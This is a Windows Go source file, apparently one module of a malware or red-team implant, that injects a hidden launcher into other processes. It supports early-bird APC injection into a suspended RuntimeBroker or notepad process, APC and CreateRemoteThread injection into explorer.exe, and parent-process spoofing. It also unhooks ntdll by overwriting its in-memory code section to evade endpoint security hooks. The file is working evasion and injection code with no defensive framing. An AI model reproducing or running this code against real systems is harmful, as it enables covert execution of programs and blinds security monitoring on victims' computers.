//go:build windows

package main

import (
	"encoding/binary"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

var (
	pOpenProc     = k32.NewProc("OpenProcess")
	pVirtAllocEx  = k32.NewProc("VirtualAllocEx")
	pWriteMem     = k32.NewProc("WriteProcessMemory")
	pCreateRT     = k32.NewProc("CreateRemoteThread")
	pQueueAPC     = k32.NewProc("QueueUserAPC")
	pResumeTh     = k32.NewProc("ResumeThread")
	pOpenTh       = k32.NewProc("OpenThread")
	pCreateProcW  = k32.NewProc("CreateProcessW")
	pInitAttr     = k32.NewProc("InitializeProcThreadAttributeList")
	pUpdateAttr   = k32.NewProc("UpdateProcThreadAttribute")
	pDeleteAttr   = k32.NewProc("DeleteProcThreadAttributeList")
	pThread32F    = k32.NewProc("Thread32First")
	pThread32N    = k32.NewProc("Thread32Next")
	pWinExec      = k32.NewProc("WinExec")
)

const (
	procAllAccess  = 0x1F0FFF
	memCommit      = 0x1000
	memReserve     = 0x2000
	pageRWX        = 0x40
	createSusp     = 0x00000004
	extStartInfo   = 0x00080000
	th32SnapThread = 0x00000004
	threadSetCtx   = 0x0010
	threadSuspend  = 0x0002
	threadQuery    = 0x0040
	attrParentProc = 0x00020000
)

type procEntry32 struct {
	Size            uint32
	CntUsage        uint32
	ProcessID       uint32
	DefaultHeapID   uintptr
	ModuleID        uint32
	Threads         uint32
	ParentProcessID uint32
	PriClassBase    int32
	Flags           uint32
	ExeFile         [260]uint16
}

type threadEntry32 struct {
	Size           uint32
	CntUsage       uint32
	ThreadID       uint32
	OwnerProcessID uint32
	PriBase        int32
	Delta          int32
	Flags          uint32
}

type startupInfoEx struct {
	Cb            uint32
	_             uint32
	Reserved      *uint16
	Desktop       *uint16
	Title         *uint16
	X, Y, XSize, YSize, XCount, YCount uint32
	Fill          uint32
	Flags         uint32
	ShowWindow    uint16
	_             uint16
	_             uint32
	Reserved2     *byte
	StdIn, StdOut, StdErr uintptr
	AttrList      uintptr
}

type procInfo struct {
	Process uintptr
	Thread  uintptr
	Pid     uint32
	Tid     uint32
}

func findPID(name string) uint32 {
	want := strings.ToLower(name)
	snap, _, _ := pCreateTool.Call(0x00000002, 0)
	if snap == 0 || snap == uintptr(^uint(0)) {
		return 0
	}
	defer pCloseH.Call(snap)
	var e procEntry32
	e.Size = uint32(unsafe.Sizeof(e))
	ok, _, _ := pProc32F.Call(snap, uintptr(unsafe.Pointer(&e)))
	for ok != 0 {
		n := syscall.UTF16ToString(e.ExeFile[:])
		if strings.ToLower(n) == want {
			return e.ProcessID
		}
		ok, _, _ = pProc32N.Call(snap, uintptr(unsafe.Pointer(&e)))
	}
	return 0
}

func findThread(pid uint32) uintptr {
	snap, _, _ := pCreateTool.Call(th32SnapThread, 0)
	if snap == 0 || snap == uintptr(^uint(0)) {
		return 0
	}
	defer pCloseH.Call(snap)
	var e threadEntry32
	e.Size = uint32(unsafe.Sizeof(e))
	ok, _, _ := pThread32F.Call(snap, uintptr(unsafe.Pointer(&e)))
	for ok != 0 {
		if e.OwnerProcessID == pid {
			h, _, _ := pOpenTh.Call(threadSetCtx|threadSuspend|threadQuery, 0, uintptr(e.ThreadID))
			if h != 0 {
				return h
			}
		}
		ok, _, _ = pThread32N.Call(snap, uintptr(unsafe.Pointer(&e)))
	}
	return 0
}

func winExecAddr() uintptr {
	if pWinExec.Find() == nil {
		return pWinExec.Addr()
	}
	return 0
}

func trampoline(pathAddr, winExec uintptr) []byte {
	// mov rcx, pathAddr
	// xor rdx, rdx          ; SW_HIDE = 0
	// mov rax, winExec
	// jmp rax
	b := make([]byte, 32)
	b[0] = 0x48
	b[1] = 0xB9
	binary.LittleEndian.PutUint64(b[2:], uint64(pathAddr))
	b[10] = 0x48
	b[11] = 0x31
	b[12] = 0xD2
	b[13] = 0x48
	b[14] = 0xB8
	binary.LittleEndian.PutUint64(b[15:], uint64(winExec))
	b[23] = 0xFF
	b[24] = 0xE0
	return b[:25]
}

func remoteWrite(proc uintptr, data []byte) uintptr {
	addr, _, _ := pVirtAllocEx.Call(proc, 0, uintptr(len(data)+16), memCommit|memReserve, pageRWX)
	if addr == 0 {
		return 0
	}
	var wrote uintptr
	pWriteMem.Call(proc, addr, uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)), uintptr(unsafe.Pointer(&wrote)))
	if wrote == 0 {
		return 0
	}
	return addr
}

func writePathAndStub(proc uintptr, exe string) (stub uintptr, ok bool) {
	we := winExecAddr()
	if we == 0 {
		return 0, false
	}
	path := append([]byte(exe), 0)
	pathAddr := remoteWrite(proc, path)
	if pathAddr == 0 {
		return 0, false
	}
	code := trampoline(pathAddr, we)
	stub = remoteWrite(proc, code)
	return stub, stub != 0
}

func createSuspended(image string, parent uint32) (proc, thread uintptr, pid uint32, ok bool) {
	app, err := syscall.UTF16PtrFromString(image)
	if err != nil {
		return
	}
	var si startupInfoEx
	var pi procInfo
	flags := uint32(createSusp | createNoWin)
	var attrBuf []byte
	var parentH uintptr
	if parent != 0 {
		parentH, _, _ = pOpenProc.Call(procAllAccess, 0, uintptr(parent))
		if parentH != 0 {
			var sz uintptr
			pInitAttr.Call(0, 1, 0, uintptr(unsafe.Pointer(&sz)))
			if sz < 128 {
				sz = 128
			}
			attrBuf = make([]byte, sz)
			pInitAttr.Call(uintptr(unsafe.Pointer(&attrBuf[0])), 1, 0, uintptr(unsafe.Pointer(&sz)))
			pUpdateAttr.Call(uintptr(unsafe.Pointer(&attrBuf[0])), 0, attrParentProc, uintptr(unsafe.Pointer(&parentH)), unsafe.Sizeof(parentH), 0, 0)
			si.AttrList = uintptr(unsafe.Pointer(&attrBuf[0]))
			si.Cb = uint32(unsafe.Sizeof(si))
			flags |= extStartInfo
		}
	}
	if si.Cb == 0 {
		si.Cb = 104 // STARTUPINFOW
	}
	si.Flags = 1 // STARTF_USESHOWWINDOW
	si.ShowWindow = 0
	r, _, _ := pCreateProcW.Call(
		uintptr(unsafe.Pointer(app)),
		0, 0, 0, 0,
		uintptr(flags),
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if parentH != 0 {
		if len(attrBuf) > 0 {
			pDeleteAttr.Call(uintptr(unsafe.Pointer(&attrBuf[0])))
		}
		pCloseH.Call(parentH)
	}
	if r == 0 {
		return
	}
	return pi.Process, pi.Thread, pi.Pid, true
}

func launchInjected(exe, method string, ppid bool) bool {
	we := winExecAddr()
	if we == 0 {
		return false
	}
	parent := uint32(0)
	if ppid {
		parent = findPID("explorer.exe")
	}
	m := strings.ToLower(strings.TrimSpace(method))
	switch m {
	case "earlybird":
		image := filepath.Join(os.Getenv("WINDIR"), "System32", "RuntimeBroker.exe")
		if _, err := os.Stat(image); err != nil {
			image = filepath.Join(os.Getenv("WINDIR"), "System32", "notepad.exe")
		}
		proc, th, _, ok := createSuspended(image, parent)
		if !ok {
			return false
		}
		defer pCloseH.Call(proc)
		defer pCloseH.Call(th)
		stub, ok := writePathAndStub(proc, exe)
		if !ok {
			return false
		}
		pQueueAPC.Call(stub, th, 0)
		pResumeTh.Call(th)
		return true
	case "apc":
		pid := findPID("explorer.exe")
		if pid == 0 {
			pid = findPID("sihost.exe")
		}
		if pid == 0 {
			return false
		}
		proc, _, _ := pOpenProc.Call(procAllAccess, 0, uintptr(pid))
		if proc == 0 {
			return false
		}
		defer pCloseH.Call(proc)
		stub, ok := writePathAndStub(proc, exe)
		if !ok {
			return false
		}
		th := findThread(pid)
		if th == 0 {
			return false
		}
		defer pCloseH.Call(th)
		r, _, _ := pQueueAPC.Call(stub, th, 0)
		return r != 0
	default: // crt
		pid := findPID("explorer.exe")
		if pid == 0 {
			pid = findPID("sihost.exe")
		}
		if pid == 0 {
			return false
		}
		proc, _, _ := pOpenProc.Call(procAllAccess, 0, uintptr(pid))
		if proc == 0 {
			return false
		}
		defer pCloseH.Call(proc)
		stub, ok := writePathAndStub(proc, exe)
		if !ok {
			return false
		}
		th, _, _ := pCreateRT.Call(proc, 0, 0, stub, 0, 0, 0)
		if th != 0 {
			pCloseH.Call(th)
			return true
		}
		return false
	}
}

func unhookNtdll() {
	sys := filepath.Join(os.Getenv("WINDIR"), "System32", "ntdll.dll")
	raw, err := os.ReadFile(sys)
	if err != nil || len(raw) < 0x200 {
		return
	}
	if raw[0] != 'M' || raw[1] != 'Z' {
		return
	}
	peOff := int(binary.LittleEndian.Uint32(raw[0x3C:]))
	if peOff+0x108 > len(raw) {
		return
	}
	sections := int(binary.LittleEndian.Uint16(raw[peOff+6:]))
	optSize := int(binary.LittleEndian.Uint16(raw[peOff+20:]))
	secOff := peOff + 24 + optSize
	h, _, _ := pGetMod.Call(uintptr(unsafe.Pointer(&[]byte("ntdll.dll\x00")[0])))
	if h == 0 {
		return
	}
	for i := 0; i < sections; i++ {
		off := secOff + i*40
		if off+40 > len(raw) {
			return
		}
		name := strings.TrimRight(string(raw[off:off+8]), "\x00")
		if name != ".text" {
			continue
		}
		vsz := binary.LittleEndian.Uint32(raw[off+8:])
		vaddr := binary.LittleEndian.Uint32(raw[off+12:])
		rawsz := binary.LittleEndian.Uint32(raw[off+16:])
		rawptr := binary.LittleEndian.Uint32(raw[off+20:])
		n := vsz
		if rawsz < n {
			n = rawsz
		}
		if int(rawptr+n) > len(raw) {
			return
		}
		dst := h + uintptr(vaddr)
		src := raw[rawptr : rawptr+n]
		var old uint32
		pVirtProt.Call(dst, uintptr(n), pageRWX, uintptr(unsafe.Pointer(&old)))
		for i := uint32(0); i < n; i++ {
			*(*byte)(unsafe.Pointer(dst + uintptr(i))) = src[i]
		}
		pVirtProt.Call(dst, uintptr(n), uintptr(old), uintptr(unsafe.Pointer(&old)))
		return
	}
}
